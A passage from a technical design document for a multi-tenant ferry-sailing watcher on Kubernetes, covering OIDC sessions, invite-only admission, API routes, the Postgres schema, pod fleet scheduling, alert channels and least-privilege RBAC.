    8-character code (valid 2 minutes, single use, bound to that `state`). The person types it into the
    home-screen app, which redeems it with its app secret (`POST /auth/redeem`) for its own session token. A
    sign-in link started by someone else yields nothing unless the victim reads them the code shown after
    their own sign-in.

#### 6.2.5 Alternatives considered

| | **A: app-native OIDC, cookie-less session (chosen)** | B: Authelia ext-auth + trusted headers (the previous choice) | C: Envoy Gateway's OIDC SecurityPolicy, with `jwt.claimToHeaders` |
|---|---|---|---|
| Owner's round-2 ask ("Can we use oidc?") | Yes | No (proxy and headers) | OIDC, but performed by the gateway |
| Where identity is checked | ferry-web verifies a signed `id_token`, then its own session | Authelia; Envoy copies `Remote-*` headers to the app | Envoy; claims copied into headers for the app |
| If the gateway policy is missing or detached | **Fails closed**: no session, 401 | Fails open: a client-sent `Remote-User` is believed | Fails open the same way |
| Testable without the gateway | Yes (unit tests against a fake issuer) | No | No |
| The owner's Authelia cookie at the backend | Dropped with every Cookie header; the app has none | Dropped after ext-auth | EG's own OIDC session cookies live on the ferry host; the route can still drop Cookie after the filter, but the session is EG's |
| App code | OIDC client, sessions, bearer plumbing (about 4-5 days) | Header adapter (about 1 day) | Header adapter, plus EG OIDC and JWT config |
| Gateway and Authelia changes | One RequestHeaderModifier; one OIDC client | Route SecurityPolicy, ReferenceGrant entry, `access_control` rule | Route SecurityPolicy holding the client secret in `ferry-watch` |
| Session length | The app's own (7 d idle, 30 d), re-verified with Authelia every 24 h, silently while Authelia's session lives | Authelia's | EG's cookie lifetime |
| Removal at the IdP (lldap group, deleted user) | Reaches the app at the next re-verification, within 24 h (R20); suspend in the app for immediate effect | Within about a minute (every request re-checked; LDAP refresh 1 m) | At EG's next token refresh |
| New residuals | Token in localStorage (R17), iOS redirect context (R18), unauthenticated requests reach the app (R19), IdP removal delayed up to 24 h (R20) | Fail-open on detachment (former R15) | Fail-open on detachment |

Why A: the owner asked for OIDC; it fails closed; it is testable without the gateway; and the cookie-less
session removes the only thing that made it costly on `chestr.dev`, the choice between gateway-wide Lua and a
separate domain. B and C are both header trust whose safety depends on a gateway object staying attached to
the route. Both stay documented here in case a later IdP change makes a proxy attractive again.

#### 6.2.6 The abstraction and replacing the IdP

```python
@dataclass(frozen=True)
class Principal:
    issuer: str; subject: str; username: str | None; email: str | None; name: str | None; groups: frozenset[str]

class IdentityProvider(Protocol):          # how a person proves who they are
    def routes(self) -> list[web.RouteDef]: ...                                # /auth/* for OIDC; none for headers
    async def authenticate(self, request: web.Request) -> Principal | None: ... # header adapters only

class Sessions(Protocol):                  # the app's own bearer sessions, independent of the IdP
    async def create(self, uid: str, principal: Principal) -> str: ...         # returns the token once
    async def resolve(self, token: str) -> str | None: ...                     # uid, or None
    async def revoke(self, *, token: str | None = None, uid: str | None = None) -> None: ...
```

- `OidcProvider` (v1, production): one or more configured providers in `identity.oidc.providers[]`, each
  with issuer, client id, a secret reference, scopes, the claim names for username, email, name and groups,
  and the invite-match claim. The `provider` part of the uid is the issuer URL.
- `TrustedHeaderProvider`: kept only as a LAN or dev adapter (docker compose, or a LAN-only route on
  envoy-internal behind its gateway-wide ext-auth). Its principal is `iss` = the configured
  `identity.trustedHeaders.issuer` (for example `header:authelia-lan`) and `sub` = `Remote-User` (the lldap
  username). That is not Authelia's OIDC `sub` (an opaque UUID), so switching a deployment between the two
  needs one alias per user. Off in production; the chart fails to render it enabled together with the
  external dashboard route (`routes.dashboard.enabled`, helm-unittest). The checkout route has its own flag
  (`routes.checkout.enabled`), so a LAN deployment can use the adapter and still have checkout.
- **Stable id:** `h = "u" + base32lower(sha256("fw/v1|" + iss + "|" + sub))[:19]` (20 characters,
  DNS-label safe), and `uid = identityAliases.get(h, h)`, computed at every sign-in from the verified
  `id_token` and the ConfigMap only. It is deterministic, so no DB row can map a principal onto another
  user's browsers: `identities.uid` is a cache that must equal it (a mismatch refuses the sign-in, C23).
  Authelia's `sub` is an opaque UUID per *username* (`internal/oidc/store.go:76-101`), so a uid exists only
  after the person's first sign-in (invitations bind then, §6.2.7), and a reused username would inherit it
  (R21).
- `identityAliases` (`new principal hash → existing uid`) in the GitOps ConfigMap carry users across an IdP
  change. Aliases take precedence over `identities` rows and over `bootstrapAdmins`, so pointing
  `bootstrapAdmins` at a new issuer first cannot give the owner a fresh uid with no trips.
- Email and username are for display, invitations and alias proposals, never a key.

**Replacing the IdP later** (runbook):
1. **A provider that speaks OIDC and gives what we need directly** (Google): add it to
   `identity.oidc.providers` (issuer, client, claim names), register the redirect URI with it, and add its
   egress (`toFQDNs` for its token and JWKS hosts).
2. **Providers without plain OIDC, or several at once** (GitHub has no OIDC `id_token` for users; Apple
   relays email addresses; "Google or GitHub"): put a broker in front (Dex, Pocket ID or authentik, for
   example) and make it ferry-web's one issuer, or configure several `OidcProvider` entries and show one
   button per provider. Several entries need each flow bound to its provider first (a per-provider redirect
   URI and a provider id posted with the code and checked against the `id_token`'s `iss`, §6.2.2 step 4),
   so a code from one issuer can't be exchanged as another's.
3. **Moving existing users:** each person signs in once through the new issuer and lands as an unmatched
   identity ("Your access is being set up"), recorded in `unmatched_identities` (§6.2.2 step 5). The admin
   proposes aliases from that list by matching email or username against existing users (by hand from the
   Users page in v1; the CLI is M4) and writes them as a GitOps PR; once merged, that identity maps to the
   old uid. Running pods keep working, because `FW_OWNER` is the old uid.
4. **Admission:** social IdPs have no `ferry-watch` group, so the app's own invitation list is the gate
   (matched on a verified email, or on one-time invite codes where emails differ).
5. **Cookies:** none of this puts a cookie on the ferry host, so R12 stays closed.

Nothing in the browser pods, the VNC gate, the VAPs or the operator changes, because they key on the uid.

#### 6.2.7 Invite-only

- v1 admission has three gates: Authelia issues codes for the `ferry-watch` client only to groups
  `ferry-watch` and `admin` (the client's authorization policy, default deny); the app admits only people the
  admin invited on the Users page; suspension revokes every session and closes the user's sockets at once.
  The first gate is evaluated when Authelia issues a code, so at sign-in and at each 24-hourly
  re-verification, not on every request (R20); to remove someone at once, suspend them in the app first
  (§12.5).
- "Add person" (lldap username, email, optional limit overrides, mandatory reason) creates an `invites` row
  and sends the `invited` email (§12.5). The first sign-in from the configured issuer whose
  `preferred_username` matches an open invitation creates the user with `uid = hash(iss, sub)`, applies the
  overrides and closes the invitation. The match claim is config: `preferred_username` for Authelia (lldap
  usernames are admin-made and unique at any moment, and must never be reused, R21), or `email` for a
  provider that really verifies it (Authelia 4.39 only asserts `email_verified`). Invitations expire after
  30 days.
- Optional `autoApproveGroups` (default empty) lets membership of a listed group stand in for "Add person"
  while the IdP is lldap. Groups are a generic OIDC claim, load-bearing only if the owner turns this on, and
  read at sign-in and re-verification only.
- The draft's "request access" queue stays deferred: nobody outside the client's groups can get a code for
  this client. It returns with a social IdP.

#### 6.2.8 Admins

`bootstrapAdmins` in GitOps names the owner by issuer and username (for example
`{issuer: https://auth.chestr.dev, username: <owner>}`). It acts as a standing invitation: the first matching
sign-in binds it to that uid (after `identityAliases` are applied, §6.2.6), which the UI cannot demote.
`users.is_admin` is the DB flag for other admins. The `groups` claim never grants admin by itself. **Admins
never get VNC, exec or screenshots** of tenant browsers in the app (owner, round 3); tenants are told that
the cluster admin can technically see everything (R1).

#### 6.2.9 Hard gates before anyone new joins lldap

- Authelia `identity_providers.oidc.authorization_policies` restrict Immich, Windmill, Grafana, Autobrr and
  Paperless to their own groups, using the same mechanism as the `ferry-watch` client; today every client
  accepts any lldap user at `two_factor` (`configuration.yaml:131-214`). They keep `two_factor`; only the
  `ferry-watch` client is `one_factor` (owner, round 3).
- Never give the app lldap admin credentials.
- Never reuse an lldap username (R21).

### 6.3 API changes (`server.py`)

**Middleware and plumbing:**
- The identity middleware (it resolves `Authorization: Bearer` through `Sessions.resolve`, §6.2.6) goes
  **inside** `error_middleware`, so its 401/403 `ApiError` is JSON-formatted:
  `[security_headers, cache, error, identity, cross_site]` (today `server.py:449-451`; aiohttp runs the list
  outermost first, and `error_middleware` at `server.py:201-217` formats `ApiError`). `/livez` and `/readyz`
  replace `/healthz` (`server.py:426-433`), are exempt from identity, and return nothing tenant-specific.
  Static files and `/auth/*` are exempt too; everything under `/api/` requires a session, except `/api/ws`,
  which a browser cannot send a header on and which must authenticate with its first message instead
  (§6.2.2 step 7).
- `Services` (`server.py:60-95`) becomes a **repository scoped by user**. Every lookup takes
  `(uid, trip_id)`, and a foreign trip returns the same 404 as a missing one. Filtering happens in SQL, not in
  `views.py`, so a new snapshot field cannot leak across tenants.
- The Hub (`server.py:134-184`) becomes **per user**: each client authenticates with its first message
  within 5 s (§6.2.2) and records its uid and its session's `token_hash`, and is closed when that session is
  revoked or expires (checked on every ping); unauthenticated sockets are capped per client
  (`CF-Connecting-IP`) and in total; incoming messages are capped at 4 KiB; `trip_changed` marks only that
  user dirty; one payload is built per dirty user, coalesced over 100 ms; at
  most 5 sockets per user, each living at most 60 min. The newest-only sender, the 15 s ping and the 10 s send
  timeout are kept.

**Route changes:**

| Route | Change |
|---|---|
| `GET /auth/config` | **New.** Public sign-in settings: authorization endpoint, client id, scopes, redirect URI. Nothing secret. |
| `POST /auth/session` | **New.** `{code, code_verifier, state, nonce}` → `{token, idle_expires_at, expires_at, reverify_at}` (§6.2.2). With a current token in `Authorization`, a successful exchange for the same uid rotates it (re-verification). Body ≤ 4 KiB; rate-limited per client (`CF-Connecting-IP`) with a global ceiling as backstop. |
| `POST /auth/logout` | **New.** Revokes the current session and closes its sockets. |
| `POST /auth/start`, `POST /auth/redeem` | **Only if S-IOS fails:** the handoff-code fallback (§6.2.4). |
| `GET /api/me/sessions`, `DELETE /api/me/sessions` | **New.** List my sessions; "sign out everywhere". |
| `GET /api/state` | Per-user snapshot: `me` (`paused` is kept for one release and is always false), `limits` (effective value plus source), `usage`, `trips[].browser{phase, mode (warm, short_check, off), reason, queue_position, next_check_at, last_check_at, effective_interval, next_due, heartbeat_at, cart, viewer, lockdown_ok}`, `trips[].quiet` (in the user's quiet hours and not lifted: not checked; `next_check_at` is then when they end), `capacity{can_add, reason}`, `settings{quiet_hours: {start, end} or null}`, `quiet_hours{start, end, now}` (for one release always an object, which a 0.6.2 dashboard needs: a user with none gets 23:00-06:00 with `now` false; read the setting from `settings`), `links{kofi}`, events. Drops the global `checkout_url`, `login_configured`, `alerts_configured` and `max_trips` (`views.py:118-143`). |
| `POST/PATCH/DELETE /api/trips[/{id}]` | Scoped to the user, with transactional limits (§9.2): `maxTrips` and the 30-day horizon. Enabling never fails for `maxActiveBrowsers`; the fleet loop picks the warm trip (§6.6). DELETE archives the trip at once, and the fleet loop drains its pod within a pass, even one holding a cart (0.6.4): the drain lets the cart go (one being added too) and frees the user's one hold, and since the trip is gone, ferry-control asks no "Did you book it?". A hold mid-payment is left to the site, as any drain does. |
| `POST /api/trips/{id}/check` | Replaces `POST /api/check` (`server.py:403-407`). On the warm trip it sends `check_now`; on another trip it makes a short check due now (a pod start). Lifts the user's quiet hours for the trip for 10 minutes (`trip_runtime.quiet_lifted_until`). 6/h per user. |
| `POST /api/trips/{id}/hold` | "Hold it for me": a bookable sailing in the trip's times that nothing holds. Sets `trip_runtime.hold_requested_until` (now + 10 min) and checks now (counted as a manual check). While it lasts, ferry-control's gate skips quiet hours and the trip's auto-cart off for that trip; nothing else. 409 with the reason when there's nothing to hold, the trip is paused, every bookable departure was held once already (`alert_memory.alerted`: the pod never carts those again), or a limit stands in the way (a claim that lapsed doesn't count as holding elsewhere). Each trip in `GET /api/state` and the live socket's state carries `hold{reason, can_request, holdable, requested_at, requested_until}` and `booking_url`. |
| `POST /api/trips/{id}/cart/release` and `/dismiss` | Scoped. Inserts an `agent_commands` row. |
| `POST /api/trips/{id}/cart/self-book` | **New.** Release, then return `search_url` for the user to book directly. |
| `POST /api/trips/{id}/vnc` | **New.** Ticket mint (§3.6 step 4). A bearer-authenticated JSON POST; the existing Origin and JSON checks still apply. |
| `POST /api/trips/{id}/booked` `{booked: bool, reason?: enum, stop?: bool}` | **New.** The "Did you book it?" answer; until it arrives the trip stays paused (round 3). `true` archives; `false` clears the pause; `{booked: false, stop: true}` ("No, cancel") archives it as DELETE does and records the answer `cancelled` (`stop` with `booked: true` is a 400). `reason` is one of `needed_account`, `tried_sign_in`, `payment_failed`, `checkout_broke`, `ran_out_of_time`, `changed_mind` (§5.7). |
| `PATCH /api/me` | `{quiet_hours: {start: "HH:MM", end: "HH:MM"} or null}`, exactly: the user's own quiet hours (Pacific; `start` ≠ `end`; null for none, the default), in `user_settings`. Anything else is a 400. It replaced `{paused}` ("pause all my trips") in 0.6.3: trips are paused one at a time with `PATCH /api/trips/{id} {enabled}`. The per-user interval preference is gone: the poll curve is fleet-wide policy (`polling.py`, round 3). |
| `DELETE /api/me` | **New.** Delete my data: drain pods, delete trips, push subscriptions, alert memory, sessions and `identities` rows; strip user and trip ids from `hold_outcomes`; redact audit payloads to ids. |
| `POST/DELETE /api/me/push-subscriptions` | **New.** Web Push. |
| `POST /api/alerts/test` | Per-user cooldown (6/h) instead of the global 30 s (`server.py:46`, `:410-423`). |
| `GET /c/{trip}`, `/admin`, `/settings`, `/auth/callback` | Serve `index.html` (explicit routes, no wildcard). |
| `/api/admin/*` | §9.4 |

### 6.4 Storage and data model (Postgres `ferrywatch` on `postgres17`)

**Roles:**
- `ferrywatch` (owner) is created by the stock `postgres-init` Job from `ferrywatch-initdb-secret`
  (`components/cnpg`, unchanged), and used only by `db-migrate`.
- `ferrywatch_web` and `ferrywatch_control` are login roles declared as CNPG managed roles on `postgres17`
  (home-cluster `database/cloudnative-pg/cluster/cluster17.yaml`, `spec.managed.roles`, passwords from
  ExternalSecrets in `database`). They own nothing; `db-migrate` grants them exactly what they need. Our image
  never sees the superuser.
- `audit_log` is INSERT-only for both login roles. `trips.user_id` is immutable by trigger.
- RLS on `notifications`: `ferrywatch_web` may INSERT only `kind IN ('test','account','admin','invited')`.
  This keeps agent-kind rows attributable to the operator; it does not stop a compromised web from messaging
  tenants directly (§4.5).
- Migrations are plain SQL files tracked in `schema_version`, expand/contract only. The HelmRelease uses
  `upgrade.strategy: RetryOnFailure`.

| Table | Key columns | Writer(s) |
|---|---|---|
| `users` | `id text pk (uid)`, state (active/suspended), username, email, display, is_admin, paused (0004 moved it onto each trip; for 0.6.3 only, while a 0.6.2 ferry-web may still set it, ferry-control pauses all the user's trips on it and ferry-web moves it onto each trip on the next state read; a later release drops it), created_at, last_seen_at | web |
| `user_settings` | user_id pk, quiet_start, quiet_end (Pacific `time`s, both or neither, different), updated_at | web; control (read) |
| `identities` | (iss, sub) pk, uid (a cache of the derived uid; must equal it, C23), username, email, last_groups, first/last_seen | web |
| `unmatched_identities` | (iss, sub) pk, preferred_username, email, first_seen, last_seen | web |
| `invites` | id, match_claim, match_value, email, limit overrides jsonb, reason, created_by, created_at, expires_at, used_by_uid, used_at | web |
| `sessions` | `token_hash bytea pk` (SHA-256 of the bearer token), user_id, iss, sub, client_label, created_at, last_used_at, verified_at, idle_expires_at, expires_at, revoked_at, revoked_reason | web |
| `user_limits` | uid, key, value, set_by, reason, set_at | web (clamped on read) |
| `trips` | `id char(16) pk`, `user_id` (immutable), rev, spec jsonb (validated by `Trip.from_json`), enabled, `paused_reason`, `checkout_mode` (default `'guest'`; v1's CHECK allows only `'guest'`, and widening it is an expand-only migration), created/updated/archived | web; control (column grants on `paused_reason`, `archived_at` only) |
| `trip_runtime` | trip_id pk, phase, mode (warm, short_check, off), reason, queue_position, next_check_at, last_check_at, gen, failures, backoff_until, hold_requested_until, quiet_lifted_until, updated_at | control; web (next_check_at, hold_requested_until, quiet_lifted_until) |
| `browser_pods` | name pk, trip_id, uid (pod), user_id, gen, mode, egress (allowlist, hold), node, image_digest (the pinned image it was started with), agent_version (from its hello), created_at, deadline_at, ended_at, end_reason | control |
| `hold_claims` | user_id pk (one hold per user), trip_id, pod, claimed_at, cart_id (set at READY) | control |
| `trip_state` | trip_id pk, pod_uid, boot, seq, agent_phase, checked_at, next_due, effective_interval, sailings jsonb, error_class, consecutive_errors, cart jsonb, **hold_ready_at**, first_viewer_at, viewer_connected, heartbeat_at (coalesced to 30 s), lockdown_ok, working_set_mb | control |
| `agent_commands` | id, trip_id, op, cart_id, requested_by, created_at, consumed_at | web inserts; control sets consumed |
| `alert_memory` | trip_id pk, key_hash, alerted text[], offered text[], held text | control |
| `events` | id, user_id, trip_id, ts, kind, code, params jsonb (typed, bounded) | web, control (insert) |
| `notifications` (outbox) | id, user_id, trip_id, kind, params jsonb, dedup_key unique, created_at, sent_at, attempts, last_error | control inserts; web inserts (RLS-limited) and updates sent |
| `push_subscriptions` | id, user_id, endpoint, p256dh, auth, created, last_ok, failures | web |
| `vnc_mints` | jti pk, user_id, trip_id, pod, aud, cart_id (nullable: only the `fw-vnc` audience has one, §5.5), created_at | web |
| `hold_outcomes` | id, user_id, trip_id, day (Pacific), outcome, answer_reason, fare (≤ 32), vehicle_type, login_seen (none, visit, forced), release_check, checkout_seconds | control (on `bye`); web (answer reason) |
| `usage_ledger` | (user_id, day Pacific, kind) pk, amount (holds, cart_attempts, vnc_seconds, manual_checks, test_alerts, mints, pod_starts) | control, web |
| `fleet_state` | key pk, value jsonb (brake, breaker, maintenance, pause_carting, control_alive_at) | control; web (maintenance and pause toggles only) |
| `audit_log` | id, ts, actor_kind (user/admin/system), actor, action, target_kind, target_id, before, after, reason, request_id | both (INSERT only) |

- Policy defaults live in Helm values (ConfigMap), not in a DB `policy` table; per-user overrides live in
  `user_limits`. The poll policy (tiers, short-check interval, horizon; `quietStart`/`quietEnd` are deprecated
  and ignored since 0.6.3, still accepted for a release) is rendered from values
  into a `PollPolicy` (`polling.py:33-60`), whose constructor rejects a curve that is unordered, faster for
  a further trip, or below the 30 s floor.
- **Retention:** events 30 d, notifications 14 d, `browser_pods` 30 d, audit, usage and `hold_outcomes`
  400 d; sessions 30 d after they expire or are revoked; invites 30 d after use or expiry;
  `unmatched_identities` 30 d after last seen. Archived trips are deleted 90 d after
  the sailing. `DELETE /api/me` and the admin "delete user" act at once and redact
  audit `before/after` to ids.
- **No BC Ferries account data** (credentials, cookies, booking references) is ever stored; only the sailing
  and cart summaries the agent reports.
- **Backup and restore:** the cluster's PITR restores the whole shared `postgres17` (Authelia, lldap and
  Immich too), so it is not a per-app restore. The per-app path is the cnpg component's pg_dump CronJob
  (every 4 h to NFS, `components/cnpg/cronjob.yaml`); the restore runbook is in §12.5.
- New trip ids are `secrets.token_hex(8)` (16 lowercase hex), matching `_ID_RE` (`models.py:24`) and
  DNS-safe. The import CLI maps the 8-hex ids (`models.py:232`) to new ones.
- Heartbeats and sailings are written only on transitions and on each check result (under 1 write/s at 25
  pods). Liveness reads `heartbeat_at`.

### 6.5 ferry-control: hub endpoint

**Binding (D6):**
1. On upgrade it requires `Authorization: Bearer <projected token>` and calls TokenReview with
   `audiences=[ferry-watch-agent]`.
2. It requires the username `system:serviceaccount:ferry-watch-browsers:ferry-browser` and
   `extra[authentication.kubernetes.io/pod-uid]` and `[pod-name]`.
3. It looks up `browser_pods` by pod uid to get `(user_id, trip_id, gen)`, and requires
   `pod-name == fw-<trip>-g<gen>`.
4. If the row has no uid yet (the fleet loop records it right after create), it closes with 4401 and the
   agent retries.
5. Rules on the bound socket: one live socket per pod uid; a predecessor in `Draining` may send only
   `state(cart)`, `event`, `alert` and `bye`; every message's `trip` must equal the binding, otherwise it
   closes, writes an audit row and deletes the pod.

**Bus:** it LISTENs on `agent_commands` and `trips` (rev changes) and pushes `command` and `configure`. It
writes `trip_state`, `alert_memory`, `events`, `notifications` and `usage_ledger`, then NOTIFYs
`trip_changed`. Because hub and fleet share a process, the fleet loop freezes silence-based reaping in memory
whenever the hub endpoint restarted less than 2 min ago; no DB heartbeat is needed between them.

**Per-user gating** (computed into `configure.auto_cart`): holds today < `maxHoldsPerDay`, cart attempts today
< `maxCartAttemptsPerDay`, VNC minutes left ≥ `session_s`, outside the user's own quiet hours (`user_settings`,
`QuietHours` in `polling.py`) unless lifted for the trip, global `pause_carting` off and fleet-wide `autoCart`
on, and the trip's fare and vehicle type not listed in `alertOnlyFareTypes` / `alertOnlyVehicleTypes` (§5.7).
In the user's quiet hours `configure.active` is false too, unless lifted, so nothing is checked.

**Cart claims (one hold per user, C32).** A user can have a warm pod and short-check pods running at once,
so carting is coordinated here: before `add_to_cart` the agent sends `cart_claim`, and ferry-control
re-checks the gating above and runs `INSERT INTO hold_claims (user_id, trip_id, pod, claimed_at) … ON CONFLICT
(user_id) DO NOTHING`, granting the claim only if the row was inserted. A claim without `cart_held` or
`cart_failed` within 2 min lapses (the row is deleted); the row is deleted when the hold ends, and on `bye`.
If an admin raises a user's `maxActiveBrowsers`, holds at once stay at 1 (owner, round 3).

**Interval.** The hub computes each warm pod's `interval_s` from the time until the trip's first departure
(`PollPolicy.interval`, `polling.py:67-75`, over `time_until`, `:89-95`), applies the budget stretch and the
brake (§9.3), and pushes it in `configure` when it changes by more than 10 % or the trip crosses a tier.

**Notifications it inserts:** every agent-originated kind, plus `booked_it` or `booked` on `bye`, plus
admin alerts (`release_unverified`, `checkout_blocked`, `guest_checkout_failing`, binding violations).

### 6.6 ferry-control: fleet loop

**Loop:** level-triggered. A lightkube `AsyncClient` watches pods with
`app.kubernetes.io/managed-by=ferry-watch-control` and nodes, lists every 10 s, and wakes on Postgres
`LISTEN fleet_wake`. On each pass it computes the desired pods from rows, diffs them against the observed
pods, and creates or deletes. Pod names are deterministic, so AlreadyExists is idempotent. A `Cluster`
Protocol (with `FakeCluster` in tests) isolates lightkube.

**Desired set (round 3: the poll model, canonical numbers in `src/ferry_watch/polling.py`).** A trip is
*eligible* when the user is active, it isn't the user's quiet hours (or they lifted them for this trip), the
trip is enabled, has no `paused_reason`, its window
has not passed (`time_until` is not None, `polling.py:89-95`), it is not `BackingOff` or `NeedsAttention`,
and global `maintenance` is off. A trip that is only out for quiet hours is drained with reason `paused`
(never during a hold). Among a user's eligible trips:
- **Warm:** the one with the nearest first departure within 7 days (`warm_trip`, `polling.py:98-105`; ties
  by trip id), or the N nearest if an admin raised `maxActiveBrowsers` to N. It wants a long-lived pod in
  `warm` mode. When a nearer trip becomes eligible, the warm pod moves to it only while the current pod is
  Watching (never while Starting, Holding or Draining): the old pod is drained, and its trip returns to short
  checks with its next one due 6 h after its last check.
- **Short checks:** every other eligible trip (at most `maxTrips` − 1 per user while one is warm, and all of
  them while none is within 7 days). Each has `next_check_at`, due 6 h after its last check (±15 % jitter;
  `short_check_interval`, `polling.py:40`; admin-configurable up to 24 h) and at once when the trip is
  created, re-enabled or un-paused. When due, it wants a short-lived pod in `short_check` mode, which checks
  once and exits (or stays for a hold it carted). A short-check pod does not count against
  `maxActiveBrowsers`; it counts against `maxBrowsersTotal`, the quota and the start throttle.
- A trip has at most one pod at a time, so a trip that becomes warm while its short check is running waits
  for that pod to finish.

**Admission and fairness:**
- Caps: warm pods per user ≤ `maxActiveBrowsers`; all pods < `maxBrowsersTotal`, of which `shortCheckSlots`
  (default 1) are kept free of warm pods so short checks never starve; at most 2 pods Starting; at most 30
  starts in the last hour; a user's last start at least 20 s ago.
- A warm trip blocked by the cluster cap or the start throttle is `Queued(position)`; a due short check that
  can't start yet stays due ("next check overdue") and runs in due order. **No Pending pods** are created.
- Queue order for warm starts: the user with the fewest running browsers, then the nearest sailing, then the
  oldest queued (aging, so nothing starves). Short checks run oldest-due first in the spare slots, then in
  any free slot.
- No preemption. Holding pods are never displaced, including a short-check pod that carted. The exception is
  a removed trip: its pod is drained even while holding, which lets the cart go, since nobody can open its
  checkout any more (0.6.4).
- A successor pod for a trip is created only after its predecessor is gone, so at most one pod per trip
  exists and the quota needs only one pod of headroom (§8.4).

**Hold egress (round 3, §7.6).** When ferry-control first records a READY cart for a pod (`hold_ready_at`),
the fleet loop patches the pod's `ferry-watch.io/egress` label to `hold`; when the hold ends without the pod
exiting (an unviewed hold in a warm pod), it patches it back to `allowlist`. A failed patch is
retried every 5 s; a pod whose label can't be set back to `allowlist` within 60 s is deleted. On adoption
after a restart, any pod labelled `hold` without a READY cart is set back or deleted the same way.

**Pod build:** one function, `browser_pod(trip, gen, owner, cfg) -> dict` (§7.4), snapshot-tested and applied
through the real VAP in CI.

**Timers** (values in §8.2): startup timeout (for a short-check pod, also its whole check);
Pending/unschedulable (delete, Queued, admin alert); Watching silence (only when the hub endpoint has been up
at least 2 min); Holding is never reaped on silence, only by the operator's own clock (`hold_ready_at + hard cap + 5 min`) or kubelet status; back-off; orphan sweep
(labelled pods not current in `browser_pods`); failed-pod retention.

**Failed-pod retention (post-mortem):** a pod that failed and never held a cart nor had a viewer is kept for
30 min (Failed pods do not count against the compute quota), so the cluster admin can `kubectl logs` it
out-of-band. Its termination message gives the enum reason and error class. Pods that held a cart or had a
viewer are deleted at once.

**Nodes:** on cordon, Watching pods on that node get `drain` and are recreated elsewhere (after they are
gone). Holding pods are left; if the node is drained, their eviction runs the agent's SIGTERM drain, which
releases the cart and alerts the user (§7.8).

**Adoption on restart:** pods are matched by label plus `browser_pods`. Unknown labelled pods are drained
after 2 min. Pods are never touched just because ferry-control restarted.

### 6.7 Alerts and the Ko-fi link

**Sender:** only ferry-web, from the `notifications` outbox. It uses LISTEN plus a 30 s sweep, retries at
10/30/60/120/300 s, and dedupes on `dedup_key`. The `Notifier` protocol (`notify.py:40-45`) gains a
recipient; `Message` (`notify.py:31-37`) gains `user_id`, `trip_id` and `kind`; `AlertDispatcher`
(`notify.py:130-174`) is replaced by the outbox worker, so a restart no longer drops alerts mid-retry.

**Channels:**
- **Web Push (default):** VAPID keys from 1Password and per-user subscriptions. The service worker builds the
  click URL from the `trip` id against a constant origin. iOS needs 16.4+ and Add to Home Screen.
- **Email:** via `smtp-relay.default.svc.cluster.local.:2525`, from `ferry-watch@chestr.dev`. Sent for
  `cart_held`, `cart_lost`, `cart_expired`, `booked_it` and `invited`, and as the fallback when a user has no
  working push subscription.
- **Pushover is removed** for users (`PushoverNotifier`, `notify.py:53-…`; `settings.py:31-32`, `:43-45`).
  The owner's Alertmanager keeps using Pushover for ops alerts. SMS is later.

**Kinds, copy and links**, built from web's templates only:

| Kind | Channel | Copy (shape) | Link |
|---|---|---|---|
| `cart_held` (urgency high, TTL 1800 s) | push + email (same text as subject) | "Held for you: 7:00 am Tsawwassen → Swartz Bay, Fri Aug 1." / "Check out as a guest by 3:42 pm. Have your card and phone ready; your bank may ask you to approve in its app. A computer is easiest." | `/c/<trip>` |
| `hold_reminder` (unclaimed, at 15 min), `hold_ending` (session, at T−5) | push | route, date, sailing, absolute deadline | `/c/<trip>` |
| `bookable` (no cart: auto-cart off, alert-only, limit, quiet hours, or a cart already held on another trip) | push (email when no device works) | route, date, sailings, and why nothing was held (ferry-control's `held_back`, worked out when it records the alert) | `/c/<trip>`, which says why, offers "Hold it for me" and links to `search_url(trip)`; email adds `search_url` as a second link |
| `cart_failed` (the claim was granted, `add_to_cart` failed; `error_class` says how) | push | route, date, sailings, why BC Ferries refused | `/c/<trip>`, as for `bookable` |
| `cart_lost`, `cart_expired` (with "Still bookable: book on bcferries.com" when the last check saw it open), `failing` (3rd error; suppressed while the breaker is open), `checkout_blocked` | push (+ email for lost, expired) | typed | `/c/<trip>` (or `search_url`) |
| `booked_it` ("Did you book it?"), `booked` ("Booked!") | push + email | typed; email links open `/c/<trip>?answer=…`, which asks to confirm (no state change on GET) | `/c/<trip>` |
| `invited` | email | onboarding steps (§12.5) | `https://ferry.chestr.dev/` |
| admin: breaker, brake, capacity, delivery failures, `release_unverified`, `checkout_blocked`, `guest_checkout_failing` | admin push + PrometheusRules | typed | `/admin` |

`BCF_VNC_URL`/`checkout_url` (`settings.py:24`, `:63`; `notify.py:229-246`) are removed.

**Ko-fi:** the Helm value `kofiUrl` is validated against `^https://ko-fi\.com/[A-Za-z0-9_]{1,64}$`, exposed as
`state.links.kofi`, and rendered as `<a href target="_blank" rel="noopener noreferrer">` in the footer and
on the "Booked!" screen. It never appears on `ferry-checkout` or in alerts. There is no widget script, so the CSP
(`server.py:232-251`) is unchanged.

---
## 7. Kubernetes resources

### 7.1 CRDs

None. Desired state is in Postgres. Pods are derived and disposable. The admin Fleet page replaces
`kubectl get trips`.

### 7.2 Namespaces

| Namespace | Created by | Labels / notes |
|---|---|---|
| `ferry-watch` | home-cluster `kubernetes/apps/ferry-watch/` with `components/common` and `components/cnpg` | Holds ferry-web, ferry-control, vnc-edge, the db Jobs, the cnpg component secrets (including the **superuser** initdb secret, R14) and the ExternalSecret `ferry-watch`. No app SA can create pods or read Secrets here. |
| `ferry-watch-browsers` | the chart (`Namespace` template, `helm.sh/resource-policy: keep`, `kustomize.toolkit.fluxcd.io/prune: disabled`), **without** `components/common` | `pod-security.kubernetes.io/{enforce,audit,warn}=restricted`, `ferry-watch.io/browsers=true`. Contains only: browser pods, headless Service `browsers` (`publishNotReadyAddresses: true`), SA `ferry-browser` (no bindings), the params ConfigMap, quotas, LimitRange and network policies. |

### 7.3 RBAC (complete; anything not listed is denied)

```yaml
# ferry-web: no Role, no ClusterRole, automountServiceAccountToken: false
# vnc-edge, db-init, db-migrate: none, automount false
# ferry-control (the operator):
kind: ClusterRole            # ferry-watch-control-tokenreview
rules: [{apiGroups: [authentication.k8s.io], resources: [tokenreviews], verbs: [create]}]
---
kind: Role                   # ferry-watch-control, namespace ferry-watch-browsers
rules:
- {apiGroups: [""], resources: [pods], verbs: [create, delete, get, list, watch, patch]}
  # patch (round 3): only the ferry-watch.io/egress label; fw-browser-pod-lock denies every other change
---
kind: ClusterRole            # ferry-watch-control-nodes
rules: [{apiGroups: [""], resources: [nodes], verbs: [get, list, watch]}]
# ferry-browser (browser ns): no bindings; only the projected control-audience token
```

